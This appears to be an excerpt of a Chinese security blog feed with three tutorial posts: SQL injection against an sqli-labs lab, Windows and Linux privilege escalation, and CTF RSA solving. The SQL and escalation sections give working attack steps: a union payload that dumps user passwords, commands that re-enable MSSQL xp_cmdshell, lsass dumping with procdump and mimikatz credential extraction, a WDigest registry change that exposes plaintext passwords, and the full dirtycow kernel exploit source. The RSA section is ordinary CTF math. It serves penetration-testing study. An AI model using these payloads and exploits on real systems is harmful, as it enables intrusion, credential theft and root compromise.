<li><img src="/SQL%E6%B3%A8%E5%85%A5/12.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,group_concat(username,’—‘,password),3 from security.users%23</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/13.png" alt></li>
</ol>
<h3 id="0x19-盲注"><a href="#0x19-盲注" class="headerlink" title="0x19 盲注"></a>0x19 盲注</h3><ol>
<li>布尔盲注、时间盲注、报错盲注</li>
</ol>
<h2 id="0x20-mssql"><a href="#0x20-mssql" class="headerlink" title="0x20 mssql"></a>0x20 mssql</h2><h3 id="0x21-mssql注入常用函数"><a href="#0x21-mssql注入常用函数" class="headerlink" title="0x21 mssql注入常用函数"></a>0x21 mssql注入常用函数</h3><ol>
<li>DB_NAME() #当前库名</li>
<li>user #当前用户</li>
<li>suser_name() #当前登录用户名</li>
<li>@@database #</li>
<li>@@version #数据库版本</li>
<li>sysobjects #正常则为sqlserver数据库</li>
<li>msysobjects #正常则为access数据库</li>
<li>select DATABASEPROPERTYEX(‘master’,’version’) #查询SQLServer对应的内部数据库版本号</li>
</ol>
<h3 id="0x22-常用语句"><a href="#0x22-常用语句" class="headerlink" title="0x22 常用语句"></a>0x22 常用语句</h3><ol>
<li>and exsits(select * from sysobjects)&gt;0 #正常则为sqlserver数据库</li>
<li>and exsits(select * from msysobjects)&gt;0 #正常则为access数据库</li>
<li>and exists(select * from amdin) #判断是否存在admin表，其他的admin_user、admin_login、user、users、username、manager、useradmin等等</li>
<li>and exists(select admin from admin_user) #判断是否存在admin列，其他列：id、pwd、user、users、passwd、password等等</li>
<li>order by 10 #判断字段长度</li>
<li>-xtype=’U’ #所有用户表</li>
<li>-xtype=’S’ #所有系统表</li>
<li>select name from XXX..sysobjects where xtype=’U’;</li>
<li>select name from syscolumns where id=object_id(‘xxx’);</li>
<li>select IS_SRVROLEMEMBER(‘sysadmin’); #判断是否SA权限</li>
</ol>
<h3 id="0x23-执行系统命令"><a href="#0x23-执行系统命令" class="headerlink" title="0x23 执行系统命令"></a>0x23 执行系统命令</h3><ol>
<li>select COUNT(*) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’; #判断是否存在xp_cmdshell扩展存储过程</li>
<li><strong>修复扩展存储过程</strong></li>
<li>exec sp_configure ‘show advanced options’,1; #配置选项，从 0 改为 1</li>
<li>reconfigure; #安装</li>
<li>exec sp_configure ‘xp_cmdshell’,1; #配置选项，从 0 改为 1</li>
<li>reconfigre; #安装</li>
<li>exec master..xp_cmdshell “whoami”; #执行命令</li>
<li><strong>若已删则添加</strong></li>
<li>exec sp_addextendedproc xp_cmdshell,@dllname=’xplog70.dll’ declare @o int;</li>
<li>sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;</li>
<li><strong>卸载存储过程xp_cmdshell</strong></li>
<li>exec sp_configure ‘show advanced options’,1;</li>
<li>reconfigure;</li>
<li>exec sp_configure ‘xp_cmdshell’,0;</li>
<li>reconfigure;</li>
<li><strong>彻底删除存储过程xp_cmdshell</strong></li>
<li>搜索本地xplog70.dll，删除它。</li>
</ol>
<h2 id="0x30-Access"><a href="#0x30-Access" class="headerlink" title="0x30 Access"></a>0x30 Access</h2><ol>
<li>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 MicrosoftJet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</li>
<li>主要用于asp、aspx脚本网站，以文件形式存在于目录中，数据库为*.mdb或*.accdb</li>
</ol>
<p><strong>判断注入</strong></p>
<ol>
<li>and 1=1 #返回正常</li>
<li>and 1=11 #返回错误</li>
<li></li>
</ol>
<h2 id="0x40-Oracle"><a href="#0x40-Oracle" class="headerlink" title="0x40 Oracle"></a>0x40 Oracle</h2><h2 id="0x50-postgresql"><a href="#0x50-postgresql" class="headerlink" title="0x50 postgresql"></a>0x50 postgresql</h2><h2 id="0x60-sqlite"><a href="#0x60-sqlite" class="headerlink" title="0x60 sqlite"></a>0x60 sqlite</h2><h2 id="0x70-sqlmap"><a href="#0x70-sqlmap" class="headerlink" title="0x70 sqlmap"></a>0x70 sqlmap</h2><ol>
<li>sqlmap -u “url” –sql-shell</li>
<li>sql-shelll&gt;select * from information_schema.schemata;</li>
</ol>
]]></content>
      <tags>
        <tag>注入</tag>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="0x00-提权基础"><a href="#0x00-提权基础" class="headerlink" title="0x00 提权基础"></a>0x00 提权基础</h2><h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><ol>
<li>描述：提升当前用户在服务器中的权限。</li>
<li>目的：以获取系统最高权限。</li>
<li>常见系统：windows、Linux、Android、macos</li>
</ol>
<p><strong>分类：</strong><br>3. 直接提权、间接提权<br>4. 本地提权、远程提权<br>5. 操作系统提权、应用程序提权</p>
<p><strong>本地提权</strong></p>
<ol>
<li>systeminfo #查看windows系统信息，主要是x86还是x64，修补程序等</li>
<li>uname -a #查看Linux内核版本</li>
<li>提权一般流程：利用本地文件，或上传下载提权文件到目的服务器，执行或执行相关命令来提权，但不一定成功。</li>
</ol>
<p><strong>漏洞编号</strong></p>
<ol>
<li>windows下的提权漏洞MS08-067、MS10-084等，MS08即2008年发现的漏洞。</li>
</ol>
<h3 id="0x02-工具清单"><a href="#0x02-工具清单" class="headerlink" title="0x02 工具清单"></a>0x02 工具清单</h3><ol>
<li><strong>终端工具</strong></li>
<li>cmd</li>
<li>busybox</li>
<li><strong>抓取工具</strong></li>
<li>gethashes</li>
<li>gsecdump</li>
<li>pwdump</li>
<li>saminside</li>
<li>mimikatz</li>
<li><strong>解密工具</strong></li>
<li>LC5/LC6</li>
<li>saminside</li>
<li>ophcrack</li>
<li>hashcates</li>
<li>john the ripper</li>
<li><strong>辅助工具</strong></li>
<li>Windows-Exploit-Suggester</li>
<li>Linux-Exploit-Suggester</li>
</ol>
<h2 id="0x10-windows提权"><a href="#0x10-windows提权" class="headerlink" title="0x10 windows提权"></a>0x10 windows提权</h2><h3 id="0x11-信息搜集"><a href="#0x11-信息搜集" class="headerlink" title="0x11 信息搜集"></a>0x11 信息搜集</h3><ol>
<li>搜集目标服务器的信息，判断是否存在提权条件</li>
<li>systeminfo #操作系统的配置信息</li>
<li>ipconfig /all #网络配置信息</li>
<li>ipconfig /displaydns #查看DNS解析程序缓存的内容</li>
<li>net user #查看有哪些用户</li>
<li>net localgroup #</li>
<li>net localgroup administrators #</li>
<li>net user guest #查看账户guest信息</li>
<li>net user administrator #查看账户administrator信息</li>
<li>whoami #当前用户</li>
<li>netstat -an #查看开放端口</li>
<li>hostname #查看主机名</li>
<li>schtasks /query #查看计算机计划任务</li>
<li>tasklist /svc #查看每个进程的服务</li>
<li>route print #查看路由表</li>
<li>arp -a #查看所有接口的当前arp（地址解析协议）缓存表</li>
<li>sc query type=service state=all #查看win的服务</li>
<li><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/whoami" target="_blank" rel="noopener">windows命令查询</a></li>
</ol>
<p><strong>信息搜集脚本</strong></p>
<pre><code>@echo off
echo #######system info######&gt;.\info.txt

echo systeminfo 系统信息&gt;&gt;.\info.txt
systeminfo&gt;&gt;.\info.txt
echo

echo ver 系统版本&gt;&gt;.\info.txt
ver&gt;&gt;.\info.txt
echo

echo hostname 主机名&gt;&gt;.\info.txt
hostname&gt;&gt;.\info.txt
echo

echo set 环境变量&gt;&gt;.\info.txt
set&gt;&gt;.\info.txt
echo

echo net user 用户&gt;&gt;.\info.txt
net user&gt;&gt;.\info.txt
echo

echo net localgroup 用户组&gt;&gt;.\info.txt
net localgroup&gt;&gt;.\info.txt
echo

echo net localgroup administrators 管理员信息&gt;&gt;.\info.txt
net localgroup administrators&gt;&gt;.\info.txt
echo

echo net user guest 访问用户&gt;&gt;.\info.txt
net user guest&gt;&gt;.\info.txt
echo

echo tasklist 进程信息&gt;&gt;.\info.txt
tasklist&gt;&gt;.\info.txt
echo

echo ipconfig /all 网络信息&gt;&gt;.\info.txt
ipconfig /all&gt;&gt;.\info.txt
echo

echo ipconfig /displaydns 本地DNS缓存信息&gt;&gt;.\info.txt
ipconfig /displaydns&gt;&gt;.\info.txt
echo

echo route print 路由表&gt;&gt;.\info.txt
route print&gt;&gt;.\info.txt
echo

echo arp -a ip对应的mac地址&gt;&gt;.\info.txt
arp -a&gt;&gt;.\info.txt
echo

echo netstat -ano 开发端口与连接信息&gt;&gt;.\info.txt
netstat -an&gt;&gt;.\info.txt
echo

echo sc query type=service state=all 系统注册的服务信息&gt;&gt;.\info.txt
sc query type=service state=all&gt;&gt;.\info.txt
echo

echo wmic qfe list 系统补丁信息&gt;&gt;.\info.txt
wmic qfe list&gt;&gt;.\info.txt
echo

echo schtasks 计划任务&gt;&gt;.\info.txt
schtasks&gt;&gt;.\info.txt
echo

echo 列出系统树目录&gt;&gt;.\info.txt
cd \
tree&gt;&gt;.\info.txt</code></pre><p><strong>操作系统的漏洞补丁信息搜集</strong></p>
<ol>
<li>systeminfo</li>
<li>wmic qfe list</li>
</ol>
<h3 id="0x12-提权方式"><a href="#0x12-提权方式" class="headerlink" title="0x12 提权方式"></a>0x12 提权方式</h3><ol>
<li>针对操作系统上的应用程序，上传或下载EXP并执行EXP，必要时做免杀处理。</li>
<li>利用操作系统0day提权，必要时做免杀处理。</li>
<li>使用密码抓取工具抓取服务器的用户或管理员密码并解码。</li>
</ol>
<h3 id="0x13-Windows-Exploit-Suggester漏洞验证脚本"><a href="#0x13-Windows-Exploit-Suggester漏洞验证脚本" class="headerlink" title="0x13 Windows-Exploit-Suggester漏洞验证脚本"></a>0x13 Windows-Exploit-Suggester漏洞验证脚本</h3><ol>
<li>Windows-Exploit-Suggester常用命令：</li>
<li>python windows-exploit-suggester.py –update #更新数据库</li>
<li>服务器win 2008里生成系统信息文件：systeminfo&gt;win2008.txt</li>
<li>python windows-exploit-suggester.py –database 2019-12-13-mssb.xls win2008.txt #查看系统存在的高危漏洞，显示可利用的EXP和MSF的利用模块。</li>
<li>python windows-exploit-suggester.py –database 2019-12-13-mssb.xls –ostext ‘windows server 2008 r2’ #查看指定系统版本的利用EXP</li>
<li><img src="/%E6%8F%90%E6%9D%83/2.png" alt></li>
</ol>
<h3 id="0x14-windows漏洞利用脚本"><a href="#0x14-windows漏洞利用脚本" class="headerlink" title="0x14 windows漏洞利用脚本"></a>0x14 windows漏洞利用脚本</h3><ol start="2">
<li>windows 2008（例子）的cmd执行命令：</li>
<li>systeminfo&gt;win2008.txt</li>
<li><strong>python windows-exploit-suggester.py –database 2019-12-13-mssb.xls –systeminfo ../9purview/win2008.txt</strong></li>
<li><img src="/%E6%8F%90%E6%9D%83/1.png" alt></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows漏洞利用脚本</a></li>
<li><img src="/%E6%8F%90%E6%9D%83/3.png" alt></li>
<li><strong>填坑</strong></li>
<li>新建的普通用户test无法直接执行ps1文件</li>
<li>以管理员身份运行powershell，开启执行权限：set-executionpolicy remotesigned，Y</li>
<li>再切换到test用户执行ps1脚本</li>
</ol>
<h3 id="0x15-windows账号和密码的抓取与解密"><a href="#0x15-windows账号和密码的抓取与解密" class="headerlink" title="0x15 windows账号和密码的抓取与解密"></a>0x15 windows账号和密码的抓取与解密</h3><ol>
<li><p>工具：procdump64.exe、mimikatz_trunk_x64</p>
</li>
<li><p>把procdump64.exe上传到服务器（这里测试服务器：windows server 2008）</p>
</li>
<li><p>先获取到内存文件lsass.exe进程（用于本地安全和登录策略）</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83/4.png" alt></p>
</li>
<li><p>导出lsass.exe</p>
</li>
<li><p>.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83/5.png" alt></p>
</li>
<li><p>使用mimikatz读取（管理员权限执行）</p>
</li>
<li><p>mimikatz.exe “sekurlsa::minidump lsass.dmp” </p>
</li>
<li><p>mimikatz.exe “sekurlsa::logonPasswords full”</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83/6.png" alt></p>
</li>
<li><p>windows server 2012</p>
</li>
<li><p>修改注册表：reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</p>
</li>
<li><p>重启登录之后才能抓取到密码</p>
</li>
</ol>
<h2 id="0x20-Linux提权"><a href="#0x20-Linux提权" class="headerlink" title="0x20 Linux提权"></a>0x20 Linux提权</h2><ol>
<li>使用<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">自动化脚本</a>来获取Linux系统的基本信息，特权升级检查。</li>
<li><strong>基本信息</strong>：主机名、内核版本信息、网络详细信息、服务信息、进程信息、用户信息等等。</li>
<li><strong>特权升级检查</strong>：判断当前用户是否具有root的权限，sudo访问权限，root目录是否可访问等等</li>
<li><strong>用户信息</strong>：当前用户及其他所有用户，uid/gid信息，具有root权限的用户，是否都储存在/etc/passwd</li>
</ol>
<h3 id="0x21-搜集Linux系统信息"><a href="#0x21-搜集Linux系统信息" class="headerlink" title="0x21 搜集Linux系统信息"></a>0x21 搜集Linux系统信息</h3><ol>
<li><strong>系统信息搜集</strong></li>
<li>git clone <a href="https://github.com/rebootuser/LinEnum.git" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum.git</a> #直接git（如果联网）、上传下载都行</li>
<li><img src="/%E6%8F%90%E6%9D%83/7.png" alt></li>
<li>脚本搜集信息包括：内核信息、具体发布信息、主机名、当前用户/组信息、最近登录系统的用户、正在登录的用户、组成员、疑似管理员用户、/etc/passwd内容、超级用户、/home目录下有权限的目录、环境信息、路径信息、可用终端、当前的umask值、登录密码配置信息、定时任务、关联文件权限、系统网络详细信息、TCP/UDP监听信息、运行进程、进程与相关权限、相关服务权限、相关配置文件权限、系统配置文件权限、有用的文件位置、已安装的编辑器、可读写的敏感文件、SUID文件、SGID文件、设置了POSIX功能的文件、/etc里所有<em>.conf文件、当前用户历史文件、历史命令、备份文件的位置与访问权限等等<br>*</em>特权升级检查**</li>
<li>wget <a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></li>
<li><img src="/%E6%8F%90%E6%9D%83/8.png" alt></li>
<li><strong>Linux漏洞建议脚本</strong></li>
<li>git clone <a href="https://github.com/mzet-/linux-exploit-suggester.git" target="_blank" rel="noopener">https://github.com/mzet-/linux-exploit-suggester.git</a></li>
<li><img src="/%E6%8F%90%E6%9D%83/9.png" alt></li>
<li><img src="/%E6%8F%90%E6%9D%83/10.png" alt></li>
<li>利用脚本：<a href="https://www.exploit-db.com/download/40611" target="_blank" rel="noopener">https://www.exploit-db.com/download/40611</a></li>
</ol>
<h3 id="0x2F-其他例子"><a href="#0x2F-其他例子" class="headerlink" title="0x2F 其他例子"></a>0x2F 其他例子</h3><ol>
<li><a href="http://localhost:4000/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/" target="_blank" rel="noopener">脏牛提权</a></li>
<li><a href="http://localhost:4000/HTB-Wall/" target="_blank" rel="noopener">利用screen-4.5.0提权</a></li>
</ol>
<h2 id="0xF0-CVE-2016-5195（dirtycow）"><a href="#0xF0-CVE-2016-5195（dirtycow）" class="headerlink" title="0xF0 CVE-2016-5195（dirtycow）"></a>0xF0 CVE-2016-5195（dirtycow）</h2><pre><code>/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&quot;madvise %d\n\n&quot;,c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
&gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat
&gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&quot;/proc/self/mem&quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&quot;procselfmem %d\n\n&quot;, c);
}


int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&lt;3) {
  (void)fprintf(stderr, &quot;%s\n&quot;,
      &quot;usage: dirtyc0w target_file new_content&quot;);
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&gt; Create a private copy-on-write mapping.  Updates to the
&gt; mapping are not visible to other processes mapping the same
&gt; file, and are not carried through to the underlying file.  It
&gt; is unspecified whether changes made to the file after the
&gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&quot;mmap %zx\n\n&quot;,(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}</code></pre><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li>[网络攻防实战研究——漏洞利用与提权]</li>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>提权</tag>
        <tag>书籍</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-RSA</title>
    <url>/CTF-RSA/</url>
    <content><![CDATA[<p><img src="/CTF-RSA/rsa.png" alt></p>
<blockquote>
<p><strong>RSA加密算法，一种非对称加密算法。用途：数字签名，身份认证等</strong></p>
</blockquote>
<h2 id="0x00-简单理解RSA算法"><a href="#0x00-简单理解RSA算法" class="headerlink" title="0x00 简单理解RSA算法"></a>0x00 简单理解RSA算法</h2><blockquote>
<p>最大素数：p、q，p与q互质，p、q越大越安全<br>例子：p=53，q=59<br>模数：n，n=p*q，n的二进制表示时的位数就是密钥长度<br>例子：n=53*59=3127=1100 0011 0111，所以密钥长度为12位，实际中的算法是1024位或2048位</p>
<p>欧拉函数：φ =(p-1)*(q-1)<br>例子：φ =(53-1)(59-1)=3016</p>
<p>e：与φ互质，且1&lt;e&lt;φ<br>随机取e=41，e不要取3015，这样公钥私钥值一样</p>
<p>e的模反数：d<br>存在：(e*d)%φ=1，即e*d-1=xφ，x是整数，这里可以得d=1177，x=16</p>
<p>公钥：（n,e），仅公钥是公开的，其他数字都不公开<br>公钥：（3127,41）</p>
<p>私钥：（n,d）<br>私钥：（3127,1177）</p>
<p>例子：汉字“中”，utf-8编码为[e4 b8 ad]，转10进制[228 184 173]<br><img src="/CTF-RSA/1.png" alt><br>明文：m=pow(c,d,n)=c^d%n<br>密文：c=pow(m,e,n)=m^e%n<br>pow(x,y,z)：x的y次方再取模，等效pow(x,y)%z，%取余<br>明文228的密文算法：228^41%3127=521<br>184：184^41%3127=1071<br>173：173^41%3127=1322<br>密文521的解法：521^1177%3127=228<br>1071：1071^1177%3127=184<br>1322：1322^1177%3127=173</p>
<p>5^3 mod 7=125 mod 7=6<br>a ≡ b ( mod c)，11%3余2,5%3余2<br>11 ≡ 5 ( mod 3)<br>dp≡d mod (p−1),即(dp-d)/(p-1)=d,</p>
<p>公钥加密文：flag.enc<br>公钥文件：pubkey.pem<br>私钥文件：private.key</p>
</blockquote>
<h2 id="0x01-RSA-pem文件格式"><a href="#0x01-RSA-pem文件格式" class="headerlink" title="0x01 RSA pem文件格式"></a>0x01 RSA pem文件格式</h2><p><strong>PKCS#1私钥格式文件</strong></p>
<ol>
<li>—–BEGIN RSA PRIVATE KEY—–</li>
<li>—–END RSA PRIVATE KEY—–</li>
</ol>
<p><strong>PKCS#8私钥格式文件</strong></p>
<ol>
<li>—–BEGIN  PRIVATE KEY—–</li>
<li>—–END PRIVATE KEY—–</li>
</ol>
<p><strong>PEM公钥格式文件</strong></p>
<ol>
<li>—–BEGIN PUBLIC KEY—–</li>
<li>—–END PUBLIC KEY—–</li>
</ol>
<p><strong>PEM RSA PublicKey公钥格式文件</strong></p>
<ol>
<li>—–BEGIN RSA PUBLIC KEY—–</li>
<li>—–END RSA PUBLIC KEY—–</li>
</ol>
<p><strong>RSA相关工具</strong></p>
<ul>
<li>RSATool2v17：N比特位数小于256</li>
<li><a href="https://ipcmen.com/openssl" target="_blank" rel="noopener">openssl</a></li>
<li><a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a></li>
<li><a href="http://factordb.com/" target="_blank" rel="noopener">在线分解模数N：http://factordb.com/</a></li>
<li>离线工具：msieve、yafu</li>
</ul>
<h2 id="0x02-解RSA题思路"><a href="#0x02-解RSA题思路" class="headerlink" title="0x02 解RSA题思路"></a>0x02 解RSA题思路</h2><ol>
<li>e较大：wienner攻击</li>
<li>e较小：直接爆破</li>
<li>低加密指数广播攻击：相同低指数的e和多个相同的消息m</li>
<li>Coppersmith定理攻击：只有部分高位的p或q</li>
<li>共模攻击：相同n，相同m</li>
</ol>
<h2 id="0x03-判断是否为质数"><a href="#0x03-判断是否为质数" class="headerlink" title="0x03 判断是否为质数"></a>0x03 判断是否为质数</h2><ol>
<li>import gmpy2</li>
<li>gmpy2.is_prime(11)</li>
<li><img src="/CTF-RSA/6.png" alt></li>
<li>&gt;&gt;&gt; import Crypto</li>
<li>&gt;&gt;&gt; from Crypto.Util import number</li>
<li>&gt;&gt;&gt; Crypto.Util.number.isPrime(11)</li>
<li>1</li>
<li>&gt;&gt;&gt; Crypto.Util.number.isPrime(10)</li>
<li>False</li>
<li><img src="/CTF-RSA/7.png" alt></li>
</ol>
<h2 id="0x04-最大公约数"><a href="#0x04-最大公约数" class="headerlink" title="0x04 最大公约数"></a>0x04 最大公约数</h2><ol>
<li>import gmpy2</li>
<li>gmpy2.gcd(a,b)</li>
</ol>
<h2 id="0x05-n分解"><a href="#0x05-n分解" class="headerlink" title="0x05 n分解"></a>0x05 n分解</h2><p><strong>yafu</strong></p>
<ol>
<li><img src="/CTF-RSA/4.png" alt></li>
<li>n过长时，把n写入txt：yafu.exe “factor(@)” -batchfile data.txt #注意，一定要换行，即后面加个回车</li>
</ol>
<p><strong>在线分解模数N</strong></p>
<ol>
<li><img src="/CTF-RSA/8.png" alt> </li>
</ol>
<h2 id="0x06-使用openssl处理"><a href="#0x06-使用openssl处理" class="headerlink" title="0x06 使用openssl处理"></a>0x06 使用openssl处理</h2><p><strong>pem?n?e</strong> </p>
<ol>
<li>openssl rsa -pubin -text -modulus -in warmup -in public.key #分解公钥文件得n、e</li>
<li><img src="/CTF-RSA/15.png" alt> </li>
</ol>
<h2 id="0x07-使用RsaCtfTool处理"><a href="#0x07-使用RsaCtfTool处理" class="headerlink" title="0x07 使用RsaCtfTool处理"></a>0x07 使用RsaCtfTool处理</h2><p><strong>n/e?pem</strong></p>
<ol>
<li>python RsaCtfTool.py –createpub -n 103461035900816914121390101299049044413950405173712170434161686539878160984549 -e 65537 &gt; public.pem</li>
<li><img src="/CTF-RSA/10.png" alt> </li>
</ol>
<p><strong>pem/enc?m</strong></p>
<ol>
<li>python RsaCtfTool.py –publickey 公钥文件 –uncipherfile 加密文件</li>
<li><img src="/CTF-RSA/9.png" alt> </li>
</ol>
<p><strong>pem?key</strong></p>
<ol>
<li>python RsaCtfTool.py –publickey 公钥文件 –private [&gt; private.key(密钥文件)]</li>
<li><img src="/CTF-RSA/16.png" alt></li>
</ol>
<p><strong>key?p?q?e?d?n</strong></p>
<ol>
<li><img src="/CTF-RSA/16.png" alt></li>
<li>python RsaCtfTool.py –key private.key –dumpkey #私钥分解出n、p、q、e、d</li>
<li><img src="/CTF-RSA/17.png" alt></li>
</ol>
<h2 id="0x08-CTF例子"><a href="#0x08-CTF例子" class="headerlink" title="0x08 CTF例子"></a>0x08 CTF例子</h2><p><strong>n/c/e?m</strong></p>
<ol>
<li><p>e=1，即没加密，密文就是明文</p>
</li>
<li><p><img src="/CTF-RSA/11.png" alt></p>
</li>
<li><p>e=65537,n超大</p>
</li>
<li><p>n分解：yafu-x64.exe “factor(@)” -batchfile n.txt</p>
</li>
<li><p><img src="/CTF-RSA/13.png" alt></p>
</li>
<li><p>np>
</li>
<li><p>p = 310935513029228809998830208036655366162721470228774287453148308675193510132489142448801010943658159980501154153084396100667001391643762749806500051502679498536716532334917842894939889468693960937309663256592497965458780801192062835123429808544757340971089756707788360038227894054989413747980<br>167536893779923551227744017809301855984582408943622461942486239113822841696775958645014753081946441406022729616992302829930205076689399802050792392219242304302303180769915076199603301447453070225380248784444587175874466015595462920262453189072935846093201153746322352707956339337553509285375982422142<br>16674496409625928997877221</p>
</li>
<li><p>q = 310935513029228809998830208036655366162721470228774287453148308675193510132489142448801010943658159980501154153084396100667001391643762749806500051502679498536716532334917842894939889468693960937309663256592497965458780801192062835123429808544757340971089756707788360038227894054989413747980<br>167536893779923551227744017809301855984582408943622461942486239113822841696775958645014753081946441406022729616992302829930205076689399802050792392219242304302303180769915076199603301447453070225380248784444587175874466015595462920262453189072935846093201153746322352707956339337553509285375982422142<br>16674496409625928797450473</p>
</li>
<li><p><img src="/CTF-RSA/14.png" alt></p>
</li>
</ol>
<p><strong>n/c/d?m</strong></p>
<ol>
<li>print hex(pow(c,d,N))[2:-1].decode(‘hex’)</li>
<li><img src="/CTF-RSA/12.png" alt></li>
</ol>
<p><strong>n/e1/e2/c1/c2?m</strong></p>
<ol>
<li>import gmpy2</li>
<li>gcd,a,b=gmpy2.gcdext(e1,e2)</li>
<li>m=gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n)%n</li>
</ol>
<p><strong>p/q/e?d</strong></p>
<ol>
<li>import gmpy2</li>
<li>p =gmpy2.mpz(18443)</li>
<li>q =gmpy2.mpz(49891)</li>
<li>e =gmpy2.mpz(19)</li>
<li>phi_n= (p - 1) * (q - 1)</li>
<li>d = gmpy2.invert(e, phi_n)</li>
<li>print (d)<br><img src="/CTF-RSA/2.png" alt></li>
</ol>
<p><strong>p/q/e/c?m</strong></p>
<ol>
<li>import gmpy2</li>
<li>#N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</li>
<li>p = 366669102002966856876605669837014229419</li>
<li>q = 282164587459512124844245113950593348271</li>
<li>c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</li>
<li>e = 65537</li>
<li></li>
<li>d = gmpy2.invert(e,(p-1)*(q-1))</li>
<li>#print d</li>
<li>#d=91646299298871237857836940212608056141193465208586711901499120163393577626813</li>
<li>m = gmpy2.powmod(c,d,p*q)</li>
<li>#print m</li>
<li>#m=185534734614696481020381637136165435809958101675798337848243069</li>
<li>#hex(m)=0x73756374667b50776e5f405f68756e647265645f79656172737d</li>
<li>print hex(m)[2:].decode(‘hex’)<br><img src="/CTF-RSA/3.png" alt></li>
</ol>
<p><strong>p/q/e/c?m</strong></p>
<ol>
<li>p = 169524110085046954319747170465105648233168702937955683889447853815898670069828343980818367807171215202643149176857117014826791242142210124521380573480143683660195568906553119683192470329413953411905742074448392816913467035316596822218317488903257069007949137629543010054246885909276872349326142152285347048927</li>
<li>q = 170780128973387404254550233211898468299200117082734909936129463191969072080198908267381169837578188594808676174446856901962451707859231958269401958672950141944679827844646158659922175597068183903642473161665782065958249304202759597168259072368123700040163659262941978786363797334903233540121308223989457248267</li>
<li>e = 65537</li>
<li>c = 4531850464036745618300770366164614386495084945985129111541252641569745463086472656370005978297267807299415858324820149933137259813719550825795569865301790252501254180057121806754411506817019631341846094836070057184169015820234429382145019281935017707994070217705460907511942438972962653164287761695982230728969508370400854478181107445003385579261993625770566932506870421547033934140554009090766102575218045185956824020910463996496543098753308927618692783836021742365910050093343747616861660744940014683025321538719970946739880943167282065095406465354971096477229669290277771547093476011147370441338501427786766482964</li>
<li></li>
<li>#计算d</li>
<li>def egcd(a, b): #gcd最大公约数</li>
<li>if a == 0:</li>
<li>return (b, 0, 1)</li>
<li>else:</li>
